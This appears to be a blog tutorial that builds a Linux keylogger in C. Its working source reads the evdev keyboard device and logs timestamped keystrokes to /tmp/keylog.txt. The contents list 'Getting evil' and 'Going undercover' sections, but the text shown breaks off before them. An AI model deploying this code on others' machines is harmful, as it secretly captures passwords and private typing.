<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Keylogger for Linux | Connected</title>
<meta name=keywords content="linux,keylogger,C programming"><meta name=description content="
Developing a low level keylogger for linux using C.
"><meta name=author content="ayedaemon"><link rel=canonical href=https://ayedaemon.github.io/post/2021/02/keylogger-for-linux/><link crossorigin=anonymous href=/assets/css/stylesheet.b609c58d5c11bb90b1a54e04005d74ad1ddf22165eb79f5533967e57df9c3b50.css integrity="sha256-tgnFjVwRu5CxpU4EAF10rR3fIhZet59VM5Z+V9+cO1A=" rel="preload stylesheet" as=style><link rel=icon href=https://ayedaemon.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://ayedaemon.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://ayedaemon.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://ayedaemon.github.io/apple-touch-icon.png><link rel=mask-icon href=https://ayedaemon.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><meta property="og:title" content="Keylogger for Linux"><meta property="og:description" content="
Developing a low level keylogger for linux using C.
"><meta property="og:type" content="article"><meta property="og:url" content="https://ayedaemon.github.io/post/2021/02/keylogger-for-linux/"><meta property="article:section" content="post"><meta property="article:published_time" content="2021-02-02T14:47:26+05:30"><meta property="article:modified_time" content="2024-04-02T17:19:43+05:30"><meta name=twitter:card content="summary"><meta name=twitter:title content="Keylogger for Linux"><meta name=twitter:description content="
Developing a low level keylogger for linux using C.
"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://ayedaemon.github.io/post/"},{"@type":"ListItem","position":2,"name":"Keylogger for Linux","item":"https://ayedaemon.github.io/post/2021/02/keylogger-for-linux/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Keylogger for Linux","name":"Keylogger for Linux","description":" Developing a low level keylogger for linux using C.\n","keywords":["linux","keylogger","C programming"],"articleBody":" Developing a low level keylogger for linux using C.\nI am putting this blog in a bottom-up approach. We’ll start with the basic program that can act as a keylogger.\nWhat is a Keylogger?? How to make one? Keylogger is a program (or a hardware sometimes) that logs all the keystrokes made by the keyboard.\nWe know that there is something in OS that listens to the keyboard events and perform actions accordingly. For example, when we press alt+tab it changes the current focus to another application/screen.\nAccording to wikipedia, in linux, the event devices generalizes all the raw input from device drivers and makes them available through character devices in /dev/input/ directory.\n(If you don’t know about character devices, think it as a real-time stream data)\nAll the event files/devices are located in /dev/input/ directory. It was very easy to figure out the file after looking at the directory structure.\nIt is pretty obvious that my keyboard event file is /dev/input/by-path/platform-i8042-serio-0-event-kbd. (For you, this may change, but it’ll have kbd in it’s name!!)\nSo I wrote a program that will continuously read data from this file and print it on screen.\nCODE - basic_keylogger.c\n#include #include #include #include #include #include int main(void) { errno = 0; struct input_event ev; //This is the keyboard event file char* kbd_path = \"/dev/input/by-path/platform-i8042-serio-0-event-kbd\"; int fd = open(kbd_path, O_RDONLY); if(fd == -1) { printf(\"Error %d\\n\", errno); exit(EXIT_FAILURE); } while (1) { read(fd, \u0026ev, sizeof(struct input_event)); //read from keyboard printf(\"%i - %i\\n\",ev.code, ev.value); } return 0; } Compile this and run it.\n## Compile gcc basic_keylogger.c -o basic_keylogger.out ## Execute it ./basic_keylogger.out This will give output something like this.\nI am not sure about what this all is. But I saw some pattern and decided to learn more on this later. The pattern here is, whenever ev.value is 1 then I am getting a ev.code unique for each key. So I decided to just filter out the data with ev.value == 1.\nCODE - basic_keylogger.c (minor modification)\n#include #include #include #include #include #include int main(void) { errno = 0; struct input_event ev; //This is the keyboard event file char* kbd_path = \"/dev/input/by-path/platform-i8042-serio-0-event-kbd\"; int fd = open(kbd_path, O_RDONLY); if(fd == -1) { printf(\"Error %d\\n\", errno); exit(EXIT_FAILURE); } while (1) { read(fd, \u0026ev, sizeof(struct input_event)); //read from keyboard if(ev.value == 1) { printf(\"%i - %i\\n\",ev.code, ev.value); } } return 0; } After again compiling and running this, I was just getting the useful data from everything.\nThis is the simple idea of making the keylogger. But there are a lot of things we haven’t done.\nMaking our keylogger more dynamic. Till now, we are using hard coded file name for the keyboard. We can make it more dynamic by searching for the kbd file in /dev/input/by-path/ and then read that file for the events. And then save the events in a file.\nFor this purpose, I have changed the working directory structure to make the project more modular.\nCODE:- basic_keylogger.c\n#include \"basic_keylogger.h\" int main(void) { errno = 0; struct input_event ev; char* kbd = get_me_a_keyboard(); // Get keyboard name char* kbd_path = concat(INPUT_EVENT_DIR, kbd); // Get complete path for keyboard int fd = open(kbd_path, O_RDONLY); if(fd == -1) { printf(\"Error %d\\n\", errno); exit(EXIT_FAILURE); } printf(\"Reading from %s\\n\",kbd_path); free(kbd_path); // free some memory while (1) { read(fd, \u0026ev, sizeof(struct input_event)); //read from keyboard if(ev.type == 1) log_in_file(ev); //log the event } return 0; } This main program includes basic_keylogger.h file - which I have used to include all the libraries and define macros.\nCODE:- basic_keylogger.h\n/* // // defining variables // */ #define INPUT_EVENT_DIR \"/dev/input/by-path/\" #define LOG_FILE \"/tmp/keylog.txt\" /* // // importing system headers // */ #include #include #include #include #include #include #include #include #include #include #include /* // // importing utility functions // */ #include \"utils/logger.c\" #include \"utils/helpers.c\" #include \"utils/keyboard.c\" Here are 3 more files included for obvious purposes.\nCODE:- utils/logger.c (logger function)\nvoid log_in_file(struct input_event ev) { printf(\"Logging\"); time_t t = time(NULL); struct tm tm = *localtime(\u0026t); FILE* fptr = fopen(LOG_FILE, \"a\"); // print( [date time] keycode keyvalue ) - keyvalue =\u003e {press; lift; long press} fprintf(fptr, \"[ %d-%02d-%02d %02d:%02d:%02d ] key %i state %i\\n\", tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec, ev.code, ev.value); if(tm.tm_sec == 0) { /* Do whatever you want to do here It is like a scheduler section.*/ //fprintf(fptr, \"%s\\n\", \"1 minute check\\n\"); } fclose(fptr); printf(\" logged\\n\"); } CODE:- utils/helpers.c (now only used for concatination of 2 strings)\nchar* concat(const char *s1, const char *s2) { const size_t len1 = strlen(s1); const size_t len2 = strlen(s2); char *result = malloc(len1 + len2 + 1); // +1 for the null-terminator // in real code you would check for errors in malloc here memcpy(result, s1, len1); memcpy(result + len1, s2, len2 + 1); // +1 to copy the null-terminator return result; } CODE:- utils/keyboard.c (get keyboard device from the directory)\nchar* get_me_a_keyboard() { struct dirent **namelist; int n=0,i=0; n = scandir(INPUT_EVENT_DIR, \u0026namelist, NULL, alphasort); // read the directory for the files if(n==-1) { // perror(\"Scandir Failed!!\\n\"); exit(EXIT_FAILURE); } if(n\u003c=2){ // perror(\"No devices found!!\\n\"); exit(EXIT_FAILURE); } // printf(\"[ * ] %d Devices found !!\\n\",n-2); for(i=0; i","wordCount":"1806","inLanguage":"en","datePublished":"2021-02-02T14:47:26+05:30","dateModified":"2024-04-02T17:19:43+05:30","author":[{"@type":"Person","name":"ayedaemon"}],"mainEntityOfPage":{"@type":"WebPage","@id":"https://ayedaemon.github.io/post/2021/02/keylogger-for-linux/"},"publisher":{"@type":"Organization","name":"Connected","logo":{"@type":"ImageObject","url":"https://ayedaemon.github.io/favicon.ico"}}}</script></head><body class=dark id=top><header class=header><nav class=nav><div class=logo><a href=https://ayedaemon.github.io/ accesskey=h title="Connected (Alt + H)">Connected</a><div class=logo-switches></div></div><ul id=menu><li><a href=https://ayedaemon.github.io/archives/ title=Archives><span>Archives</span></a></li><li><a href=https://ayedaemon.github.io/series/ title=Series><span>Series</span></a></li><li><a href=https://ayedaemon.github.io/tags/ title=Tags><span>Tags</span></a></li><li><a href=https://ayedaemon.github.io/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Keylogger for Linux</h1><div class=post-meta><span title='2021-02-02 14:47:26 +0530 +0530'>February 2, 2021</span>&nbsp;·&nbsp;9 min&nbsp;·&nbsp;1806 words&nbsp;·&nbsp;ayedaemon&nbsp;|&nbsp;<a href=https://github.com/ayedaemon/ayedaemon.github.io/tree/main/content/post/2021/02/keylogger-for-linux.md rel="noopener noreferrer" target=_blank>Suggest Changes</a></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#what-is-a-keylogger-how-to-make-one aria-label="What is a Keylogger?? How to make one?">What is a Keylogger?? How to make one?</a></li><li><a href=#making-our-keylogger-more-dynamic aria-label="Making our keylogger more dynamic.">Making our keylogger more dynamic.</a></li><li><a href=#what-next-getting-evil aria-label="What next? &mldr;Getting evil!!">What next? &mldr;Getting evil!!</a></li><li><a href=#going-undercover aria-label="Going undercover">Going undercover</a></li><li><a href=#conclusion aria-label=Conclusion.>Conclusion.</a></li></ul></div></details></div><div class=post-content><blockquote><p>Developing a low level keylogger for linux using C.</p></blockquote><p>I am putting this blog in a bottom-up approach. We&rsquo;ll start with the basic program that can act as a keylogger.</p><h3 id=what-is-a-keylogger-how-to-make-one>What is a Keylogger?? How to make one?<a hidden class=anchor aria-hidden=true href=#what-is-a-keylogger-how-to-make-one>#</a></h3><blockquote><p>Keylogger is a program (or a hardware sometimes) that logs all the keystrokes made by the keyboard.</p></blockquote><p>We know that there is something in OS that listens to the keyboard events and perform actions accordingly. For example, when we press <em>alt+tab</em> it changes the current focus to another application/screen.</p><p>According to wikipedia, in linux, the <a href=https://en.wikipedia.org/wiki/Evdev>event devices</a> generalizes all the raw input from device drivers and makes them available through character devices in <code>/dev/input/</code> directory.</p><p><em>(If you don&rsquo;t know about <code>character devices</code>, think it as a real-time stream data)</em></p><p>All the event files/devices are located in <code>/dev/input/</code> directory. It was very easy to figure out the file after looking at the directory structure.</p><p><img loading=lazy src=https://cdn-images-1.medium.com/max/640/1*X9cxcchj9h9vGjHKAtG_mg.png alt=directory-structure></p><p>It is pretty obvious that my keyboard event file is <code>/dev/input/by-path/platform-i8042-serio-0-event-kbd</code>. (For you, this may change, but it&rsquo;ll have <strong>kbd</strong> in it&rsquo;s name!!)</p><p>So I wrote a program that will continuously read data from this file and print it on screen.</p><p>CODE - <code>basic_keylogger.c</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;errno.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;linux/input.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>errno</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>struct</span> <span class=n>input_event</span> <span class=n>ev</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=c1>//This is the keyboard event file
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>char</span><span class=o>*</span> <span class=n>kbd_path</span> <span class=o>=</span> <span class=s>&#34;/dev/input/by-path/platform-i8042-serio-0-event-kbd&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>fd</span> <span class=o>=</span> <span class=nf>open</span><span class=p>(</span><span class=n>kbd_path</span><span class=p>,</span> <span class=n>O_RDONLY</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span><span class=p>(</span><span class=n>fd</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Error %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>errno</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>exit</span><span class=p>(</span><span class=n>EXIT_FAILURE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>while</span> <span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>read</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>ev</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=k>struct</span> <span class=n>input_event</span><span class=p>));</span> <span class=c1>//read from keyboard
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;%i - %i</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span><span class=n>ev</span><span class=p>.</span><span class=n>code</span><span class=p>,</span> <span class=n>ev</span><span class=p>.</span><span class=n>value</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Compile this and run it.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>## Compile
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>gcc basic_keylogger.c -o basic_keylogger.out
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>## Execute it
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>./basic_keylogger.out
</span></span></code></pre></div><p>This will give output something like this.</p><p><img loading=lazy src=https://cdn-images-1.medium.com/max/640/1*Y-Z4wh_4BDSNLf6v1_NF8Q.png alt=output1></p><p>I am not sure about what this all is. But I saw some pattern and decided to learn more on this later. The pattern here is, whenever <code>ev.value</code> is <code>1</code> then I am getting a <code>ev.code</code> unique for each key. So I decided to just filter out the data with <code>ev.value == 1</code>.</p><p>CODE - <code>basic_keylogger.c</code> (minor modification)</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;errno.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;linux/input.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>errno</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>struct</span> <span class=n>input_event</span> <span class=n>ev</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=c1>//This is the keyboard event file
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>char</span><span class=o>*</span> <span class=n>kbd_path</span> <span class=o>=</span> <span class=s>&#34;/dev/input/by-path/platform-i8042-serio-0-event-kbd&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>fd</span> <span class=o>=</span> <span class=nf>open</span><span class=p>(</span><span class=n>kbd_path</span><span class=p>,</span> <span class=n>O_RDONLY</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span><span class=p>(</span><span class=n>fd</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Error %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>errno</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>exit</span><span class=p>(</span><span class=n>EXIT_FAILURE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>while</span> <span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>read</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>ev</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=k>struct</span> <span class=n>input_event</span><span class=p>));</span> <span class=c1>//read from keyboard
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span><span class=p>(</span><span class=n>ev</span><span class=p>.</span><span class=n>value</span> <span class=o>==</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;%i - %i</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span><span class=n>ev</span><span class=p>.</span><span class=n>code</span><span class=p>,</span> <span class=n>ev</span><span class=p>.</span><span class=n>value</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>After again compiling and running this, I was just getting the useful data from everything.</p><p><img loading=lazy src=https://cdn-images-1.medium.com/max/640/1*zRFTkTAQGKSMSspmAxqCjg.png alt=useful-raw-data></p><p>This is the simple idea of making the keylogger. But there are a lot of things we haven&rsquo;t done.</p><h3 id=making-our-keylogger-more-dynamic>Making our keylogger more dynamic.<a hidden class=anchor aria-hidden=true href=#making-our-keylogger-more-dynamic>#</a></h3><p>Till now, we are using hard coded file name for the keyboard. We can make it more dynamic by searching for the <strong>kbd</strong> file in <code>/dev/input/by-path/</code> and then read that file for the events. And then save the events in a file.</p><p>For this purpose, I have changed the working directory structure to make the project more modular.</p><p><img loading=lazy src=https://cdn-images-1.medium.com/max/640/1*2VyFdbneXRLZPXuScZGCPg.png alt></p><p>CODE:- <code>basic_keylogger.c</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>#include &#34;basic_keylogger.h&#34;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>int main(void) {
</span></span><span class=line><span class=cl>  errno = 0;
</span></span><span class=line><span class=cl>  struct input_event ev;
</span></span><span class=line><span class=cl>  char* kbd = get_me_a_keyboard(); // Get keyboard name
</span></span><span class=line><span class=cl>  char* kbd_path = concat(INPUT_EVENT_DIR, kbd); // Get complete path for keyboard
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  int fd = open(kbd_path, O_RDONLY);
</span></span><span class=line><span class=cl>  if(fd == -1)
</span></span><span class=line><span class=cl>  {
</span></span><span class=line><span class=cl>    printf(&#34;Error %d\n&#34;, errno);
</span></span><span class=line><span class=cl>    exit(EXIT_FAILURE);
</span></span><span class=line><span class=cl>  }
</span></span><span class=line><span class=cl>  printf(&#34;Reading from %s\n&#34;,kbd_path);
</span></span><span class=line><span class=cl>  free(kbd_path); // free some memory
</span></span><span class=line><span class=cl>  while (1)
</span></span><span class=line><span class=cl>  {
</span></span><span class=line><span class=cl>    read(fd, &amp;ev, sizeof(struct input_event)); //read from keyboard
</span></span><span class=line><span class=cl>    if(ev.type == 1)
</span></span><span class=line><span class=cl>      log_in_file(ev); //log the event
</span></span><span class=line><span class=cl>  }
</span></span><span class=line><span class=cl>  return 0;
</span></span><span class=line><span class=cl>}
</span></span></code></pre></div><p>This main program <em>includes</em> <code>basic_keylogger.h</code> file - which I have used to include all the libraries and <em>define</em> macros.</p><p>CODE:- <code>basic_keylogger.h</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>/*</span>
</span></span><span class=line><span class=cl><span class=o>//</span>
</span></span><span class=line><span class=cl><span class=o>//</span> <span class=n>defining</span> <span class=n>variables</span>
</span></span><span class=line><span class=cl><span class=o>//</span>
</span></span><span class=line><span class=cl><span class=o>*/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#define INPUT_EVENT_DIR &#34;/dev/input/by-path/&#34;</span>
</span></span><span class=line><span class=cl><span class=c1>#define LOG_FILE &#34;/tmp/keylog.txt&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>/*</span>
</span></span><span class=line><span class=cl><span class=o>//</span>
</span></span><span class=line><span class=cl><span class=o>//</span> <span class=n>importing</span> <span class=n>system</span> <span class=n>headers</span>
</span></span><span class=line><span class=cl><span class=o>//</span>
</span></span><span class=line><span class=cl><span class=o>*/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#include &lt;dirent.h&gt;</span>
</span></span><span class=line><span class=cl><span class=c1>#include &lt;errno.h&gt;</span>
</span></span><span class=line><span class=cl><span class=c1>#include &lt;fcntl.h&gt;</span>
</span></span><span class=line><span class=cl><span class=c1>#include &lt;linux/input.h&gt;</span>
</span></span><span class=line><span class=cl><span class=c1>#include &lt;stdio.h&gt;</span>
</span></span><span class=line><span class=cl><span class=c1>#include &lt;stdlib.h&gt;</span>
</span></span><span class=line><span class=cl><span class=c1>#include &lt;string.h&gt;</span>
</span></span><span class=line><span class=cl><span class=c1>#include &lt;sys/stat.h&gt;</span>
</span></span><span class=line><span class=cl><span class=c1>#include &lt;sys/types.h&gt;</span>
</span></span><span class=line><span class=cl><span class=c1>#include &lt;time.h&gt;</span>
</span></span><span class=line><span class=cl><span class=c1>#include &lt;unistd.h&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>/*</span>
</span></span><span class=line><span class=cl><span class=o>//</span>
</span></span><span class=line><span class=cl><span class=o>//</span> <span class=n>importing</span> <span class=n>utility</span> <span class=n>functions</span>
</span></span><span class=line><span class=cl><span class=o>//</span>
</span></span><span class=line><span class=cl><span class=o>*/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#include &#34;utils/logger.c&#34;</span>
</span></span><span class=line><span class=cl><span class=c1>#include &#34;utils/helpers.c&#34;</span>
</span></span><span class=line><span class=cl><span class=c1>#include &#34;utils/keyboard.c&#34;</span>
</span></span></code></pre></div><p>Here are 3 more files included for obvious purposes.</p><p>CODE:- <code>utils/logger.c</code> (logger function)</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>void log_in_file(struct input_event ev)
</span></span><span class=line><span class=cl>{
</span></span><span class=line><span class=cl>  printf(&#34;Logging&#34;);
</span></span><span class=line><span class=cl>    time_t t = time(NULL);
</span></span><span class=line><span class=cl>    struct tm tm = *localtime(&amp;t);
</span></span><span class=line><span class=cl>    FILE* fptr = fopen(LOG_FILE, &#34;a&#34;);
</span></span><span class=line><span class=cl>    // print( [date time] keycode keyvalue ) - keyvalue =&gt; {press; lift; long press}
</span></span><span class=line><span class=cl>    fprintf(fptr, &#34;[ %d-%02d-%02d %02d:%02d:%02d ]   key %i state %i\n&#34;, tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec, ev.code, ev.value);
</span></span><span class=line><span class=cl>    if(tm.tm_sec == 0)
</span></span><span class=line><span class=cl>    {
</span></span><span class=line><span class=cl>      /* Do whatever you want to do here
</span></span><span class=line><span class=cl>        It is like a scheduler section.*/
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>      //fprintf(fptr, &#34;%s\n&#34;, &#34;1 minute check\n&#34;);
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>    fclose(fptr);
</span></span><span class=line><span class=cl>    printf(&#34;  logged\n&#34;);
</span></span><span class=line><span class=cl>}
</span></span></code></pre></div><p>CODE:- <code>utils/helpers.c</code> (now only used for concatination of 2 strings)</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>char</span><span class=o>*</span> <span class=n>concat</span><span class=p>(</span><span class=k>const</span> <span class=n>char</span> <span class=o>*</span><span class=n>s1</span><span class=p>,</span> <span class=k>const</span> <span class=n>char</span> <span class=o>*</span><span class=n>s2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>const</span> <span class=n>size_t</span> <span class=n>len1</span> <span class=o>=</span> <span class=n>strlen</span><span class=p>(</span><span class=n>s1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>const</span> <span class=n>size_t</span> <span class=n>len2</span> <span class=o>=</span> <span class=n>strlen</span><span class=p>(</span><span class=n>s2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>char</span> <span class=o>*</span><span class=n>result</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=n>len1</span> <span class=o>+</span> <span class=n>len2</span> <span class=o>+</span> <span class=mi>1</span><span class=p>);</span> <span class=o>//</span> <span class=o>+</span><span class=mi>1</span> <span class=k>for</span> <span class=n>the</span> <span class=n>null</span><span class=o>-</span><span class=n>terminator</span>
</span></span><span class=line><span class=cl>    <span class=o>//</span> <span class=ow>in</span> <span class=n>real</span> <span class=n>code</span> <span class=n>you</span> <span class=n>would</span> <span class=n>check</span> <span class=k>for</span> <span class=n>errors</span> <span class=ow>in</span> <span class=n>malloc</span> <span class=n>here</span>
</span></span><span class=line><span class=cl>    <span class=n>memcpy</span><span class=p>(</span><span class=n>result</span><span class=p>,</span> <span class=n>s1</span><span class=p>,</span> <span class=n>len1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>memcpy</span><span class=p>(</span><span class=n>result</span> <span class=o>+</span> <span class=n>len1</span><span class=p>,</span> <span class=n>s2</span><span class=p>,</span> <span class=n>len2</span> <span class=o>+</span> <span class=mi>1</span><span class=p>);</span> <span class=o>//</span> <span class=o>+</span><span class=mi>1</span> <span class=n>to</span> <span class=n>copy</span> <span class=n>the</span> <span class=n>null</span><span class=o>-</span><span class=n>terminator</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>result</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>CODE:- <code>utils/keyboard.c</code> (get keyboard device from the directory)</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>char* get_me_a_keyboard()
</span></span><span class=line><span class=cl>{
</span></span><span class=line><span class=cl>  struct dirent **namelist;
</span></span><span class=line><span class=cl>  int n=0,i=0;
</span></span><span class=line><span class=cl>  n = scandir(INPUT_EVENT_DIR, &amp;namelist, NULL, alphasort); // read the directory for the files
</span></span><span class=line><span class=cl>  if(n==-1)
</span></span><span class=line><span class=cl>  {
</span></span><span class=line><span class=cl>    // perror(&#34;Scandir Failed!!\n&#34;);
</span></span><span class=line><span class=cl>    exit(EXIT_FAILURE);
</span></span><span class=line><span class=cl>  }
</span></span><span class=line><span class=cl>  if(n&lt;=2){
</span></span><span class=line><span class=cl>    // perror(&#34;No devices found!!\n&#34;);
</span></span><span class=line><span class=cl>    exit(EXIT_FAILURE);
</span></span><span class=line><span class=cl>  }
</span></span><span class=line><span class=cl>  // printf(&#34;[ * ] %d Devices found !!\n&#34;,n-2);
</span></span><span class=line><span class=cl>  for(i=0; i&lt;n; i++)
</span></span><span class=line><span class=cl>    if( namelist[i]-&gt;d_name == &#34;.&#34; || namelist[i]-&gt;d_name == &#34;..&#34;) // skip for . and ..
</span></span><span class=line><span class=cl>      continue;
</span></span><span class=line><span class=cl>    else if(strstr(namelist[i]-&gt;d_name,&#34;kbd&#34;)) // check if the filename has &#34;kbd&#34; (keyboard) in it
</span></span><span class=line><span class=cl>      break;  // if yes, do not look further
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  return namelist[i]-&gt;d_name; // and return keyboard file name to caller function
</span></span><span class=line><span class=cl>}
